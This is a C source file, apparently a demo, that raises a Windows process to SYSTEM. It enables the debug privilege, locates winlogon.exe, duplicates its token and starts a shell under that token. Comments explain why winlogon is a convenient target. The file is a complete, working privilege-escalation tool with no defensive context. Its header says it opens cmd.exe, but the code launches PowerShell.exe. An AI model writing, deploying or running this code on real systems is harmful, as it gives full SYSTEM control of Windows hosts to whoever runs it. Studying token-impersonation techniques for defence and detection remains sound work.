/**

    @file      NT-AUTH-NewPrompt.c
    @brief     Upgrades the current process token to SYSTEM by impersonating
               winlogon.exe, then launches a new cmd.exe process in a new
               window with the impersonated token, granting it SYSTEM
               privileges.

**/

// Standard C includes
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <stdlib.h>
#include <psapi.h>

// Project includes
#include "WinDebugCustom.h"
#include "WinMem.h"

// ############################## Enums ##############################

typedef enum
{
    DEMO_SUCCESS           = 0,   // Operation successful
    DEMO_INVALID_PARAM     = 1,   // Invalid parameter passed
    DEMO_MEMORY_ALLOCATION = 2,   // Memory allocation failure
    DEMO_BAD_PACKET        = 3,   // Bad packet received from server
    DEMO_ERR_GENERIC       = 100, // Generic error
} DEMO_STATUS;

#define BASE_10        10
#define WIN_LOGON_PATH L"C:\\Windows\\System32\\winlogon.exe"
#define CMD_PATH       L"PowerShell.exe"

// ############################# Fn Declarations #############################

/**
    @brief  Sets the debug privilege for the current process.
**/
static DEMO_STATUS SetDebugPrivilege();

/**
    @brief  Set privilege on the provided token.
    @param  hToken           - Token handle.
    @param  pPrivilegeName   - Privilege name to set.
    @param  bEnablePrivilege - TRUE to enable, FALSE to disable.
    @retval                  - DEMO_STATUS indicating success or failure.
**/
static DEMO_STATUS SetPrivilege(HANDLE hToken,
                                PWCHAR pPrivilegeName,
                                BOOL   bEnablePrivilege);

/**
    @brief  Looks up the process ID for a given process name.
    @param  pProcessName - Name of the process to look up.
    @param  pdwProcessID - Pointer to a DWORD to receive the process ID if
                           found.
    @retval              - DEMO_STATUS indicating success or failure.
**/
static DEMO_STATUS GetProcessIDFromName(PWCHAR pProcessName,
                                        PDWORD pdwProcessID);

/**
    @brief  Checks if the process name matches the given name
    @param  dwProcessID  - The process ID to check
    @param  pProcessName - The process name to compare against
    @param  pdwProcessID - Pointer to a DWORD to receive the process ID if
                           found.
    @retval              - DEMO_SUCCESS if the names match, otherwise
DEMO_ERR_GENERIC
**/
static DEMO_STATUS ProcessNameCheck(DWORD  dwProcessID,
                                    PWCHAR pProcessName,
                                    PDWORD pdwProcessID);

// ############################## Fn Definitions ##############################

INT
wmain (INT iArgc, PWCHAR *ppArgv)
{
    UNREFERENCED_PARAMETER(iArgc);
    UNREFERENCED_PARAMETER(ppArgv);

    BOOL                bStatus             = FALSE;
    DWORD               dwTargetProcId      = 0;
    HANDLE              hToken              = NULL;
    HANDLE              hImpersonationToken = NULL;
    DEMO_STATUS         Status              = DEMO_ERR_GENERIC;
    HANDLE              TargetProcHandle    = NULL;
    STARTUPINFO         si                  = { 0 };
    PROCESS_INFORMATION pi                  = { 0 };

    Status = SetDebugPrivilege();
    if (DEMO_SUCCESS != Status)
    {
        DEBUG_PRINT("Failed to set debug privilege");
        goto EXIT;
    }

    // Our target process will be winlogon.exe, which runs as SYSTEM and is
    // always running on the machine.
    // It's also running in session 1, so it isn't protected by session
    // isolation.
    // It's not usually a ppl process, so it won't be protected by PPL
    // protections.
    Status = GetProcessIDFromName(WIN_LOGON_PATH, &dwTargetProcId);
    if (DEMO_SUCCESS != Status)
    {
        DEBUG_PRINT("Failed to find target process ID");
        goto EXIT;
    }

    TargetProcHandle
        = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwTargetProcId);
    if (NULL == TargetProcHandle)
    {
        DEBUG_ERROR("OpenProcess");
        goto EXIT;
    }

    bStatus = OpenProcessToken(
        TargetProcHandle, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken);
    if (NULL == hToken || FALSE == bStatus)
    {
        DEBUG_ERROR("OpenProcessToken");
        goto EXIT;
    }

    bStatus = DuplicateTokenEx(hToken,
                               TOKEN_ALL_ACCESS,
                               NULL,
                               SecurityImpersonation,
                               TokenImpersonation,
                               &hImpersonationToken);
    if (FALSE == bStatus)
    {
        DEBUG_ERROR("DuplicateTokenEx");
        goto EXIT;
    }

    bStatus = CreateProcessWithTokenW(hImpersonationToken,
                                      0,        // No special logon flags
                                      CMD_PATH, // Application name
                                      CMD_PATH, // Command line
                                      0,        // Creation flags
                                      NULL,     // Environment - use current
                                      NULL, // Current directory - use current
                                      &si,  // Startup info
                                      &pi); // Process information
    if (FALSE == bStatus)
    {
        DEBUG_ERROR("CreateProcessWithTokenW");
        goto EXIT;
    }
    else
    {
        DEBUG_PRINT("Launched process with impersonated token!");
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

EXIT:
    if (hToken)
    {
        CloseHandle(hToken);
    }
    if (hImpersonationToken)
    {
        CloseHandle(hImpersonationToken);
    }
    return 0;
} // wmain

static DEMO_STATUS
SetDebugPrivilege ()
{
    DEMO_STATUS Status  = DEMO_ERR_GENERIC;
    BOOL        bStatus = FALSE;
    HANDLE      hToken  = NULL;

    bStatus = OpenProcessToken(
        GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
    if (NULL == hToken || FALSE == bStatus)
    {
        DEBUG_ERROR("OpenProcessToken");
        goto EXIT;
    }

    Status = SetPrivilege(hToken, SE_DEBUG_NAME, TRUE); // To enable openprocess
    if (DEMO_SUCCESS != Status)
    {
        DEBUG_PRINT("SetPrivilege failed");
        goto EXIT;
    }

    Status = DEMO_SUCCESS;
EXIT:
    if (hToken)
    {
        CloseHandle(hToken);
    }
    return Status;
} // SetDebugPrivilege

static DEMO_STATUS
SetPrivilege (HANDLE hToken, PWCHAR pPrivilegeName, BOOL bEnablePrivilege)
{
    DEMO_STATUS      Status  = DEMO_ERR_GENERIC;
    TOKEN_PRIVILEGES tp      = { 0 };
    LUID             luid    = { 0 };
    BOOL             bStatus = FALSE;

    // Set privileges on the local system
    bStatus = LookupPrivilegeValueW(NULL, pPrivilegeName, &luid);
    if (FALSE == bStatus)
    {
        DEBUG_ERROR("LookupPrivilegeValueW failed");
        goto EXIT;
    }

    tp.PrivilegeCount     = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
    {
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    }
    else
    {
        tp.Privileges[0].Attributes = 0;
    }

    bStatus = AdjustTokenPrivileges(
        hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    if (FALSE == bStatus)
    {
        DEBUG_ERROR("AdjustTokenPrivileges failed");
        goto EXIT;
    }

    Status = DEMO_SUCCESS;
EXIT:
    return Status;
} // SetPrivilege

static DEMO_STATUS
GetProcessIDFromName (PWCHAR pProcessName, PDWORD pdwProcessID)
{
    DEMO_STATUS Status  = DEMO_ERR_GENERIC;
    BOOL        bStatus = FALSE;
    // Buff size of 1024 is used in MSDN example code:
    // https://learn.microsoft.com/en-us/windows/win32/psapi/enumerating-all-processes
    DWORD dwProcesses[1024] = { 0 };
    DWORD dwSize            = 0;
    DWORD dwProcessCount    = 0;

    bStatus = EnumProcesses(dwProcesses, sizeof(dwProcesses), &dwSize);
    if (FALSE == bStatus)
    {
        DEBUG_ERROR("EnumProcesses");
        goto EXIT;
    }

    // Calculate how many process IDs were returned
    dwProcessCount = dwSize / sizeof(DWORD);

    for (DWORD dwIdx = 0; dwIdx < dwProcessCount; dwIdx++)
    {
        DWORD dwProcessID = dwProcesses[dwIdx];

        Status = ProcessNameCheck(dwProcessID, pProcessName, &dwProcessID);
        if (DEMO_SUCCESS == Status)
        {
            DEBUG_PRINT(
                "Found process %ws with PID %d", pProcessName, dwProcessID);
            if (pdwProcessID)
            {
                *pdwProcessID = dwProcessID;
            }
            break;
        }
    }

EXIT:
    return Status;
} // GetProcessIDFromName

static DEMO_STATUS
ProcessNameCheck (DWORD dwProcessID, PWCHAR pProcessName, PDWORD pdwProcessID)
{
    DEMO_STATUS Status                  = DEMO_ERR_GENERIC;
    WCHAR       szProcessName[MAX_PATH] = { 0 };
    HANDLE      hProcess                = NULL;
    DWORD       dwSize                  = MAX_PATH;
    BOOL        bStatus                 = FALSE;
    INT         iStatus                 = 0;

    hProcess
        = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwProcessID);
    if (NULL != hProcess)
    {
        bStatus
            = QueryFullProcessImageNameW(hProcess, 0, szProcessName, &dwSize);
        if (FALSE != bStatus)
        {
            iStatus = _wcsicmp(szProcessName, pProcessName);
            if (0 == iStatus)
            {
                if (pdwProcessID)
                {
                    *pdwProcessID = dwProcessID;
                }
                Status = DEMO_SUCCESS;
                goto EXIT;
            }
        }
        // Don't need to print errors here because some processes won't allow us
        // to query.
        CloseHandle(hProcess);
    }
    // Not printing failure here because it's expected that some processes won't
    // be able to be opened.

EXIT:
    return Status;
} // GetProcessIDFromName

// End of file
